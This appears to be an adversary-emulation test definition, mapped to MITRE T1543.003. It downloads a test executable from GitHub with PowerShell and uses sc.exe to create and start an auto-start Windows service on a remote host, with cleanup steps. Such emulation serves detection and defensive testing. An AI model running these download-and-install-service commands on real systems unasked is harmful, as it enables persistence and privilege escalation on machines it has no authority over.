api_version: "2.0"
name: Remote Service Installation CMD
description: |
    Download an executable from github and start it as a service on a remote endpoint
    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
args:
    - name: service_name
      type: string
      default: AtomicTestService_CMD
    - name: remote_host
      type: string
      default: localhost
    - name: binary_path
      type: path
      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
    - name: service_type
      type: string
      default: Own
    - name: startup_type
      type: string
      default: auto
uuid: fb4151a2-db33-4f8c-b7f8-78ea8790f961
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1543: Create or Modify System Process'
    subtechniques:
        - 'T1543.003: Windows Service'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Service binary must exist on disk at specified location (#{binary_path})
      inline: |
        if (Test-Path "#{binary_path}") {exit 0} else {{New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
        }}
      executor: powershell
    - name: remote-service-installation-cmd
      inline: |
        sc.exe \\{{.Args.remote_host}} create {{.Args.service_name}} binPath= "{{.Args.binary_path}}" start={{.Args.startup_type}} type={{.Args.service_type}}
        sc.exe \\{{.Args.remote_host}} start {{.Args.service_name}}
      executor: command_prompt
      cleanup:
        inline: |
            sc.exe \\{{.Args.remote_host}} stop {{.Args.service_name}} >nul 2>&1
            sc.exe \\{{.Args.remote_host}} delete {{.Args.service_name}} >nul 2>&1
        executor: command_prompt
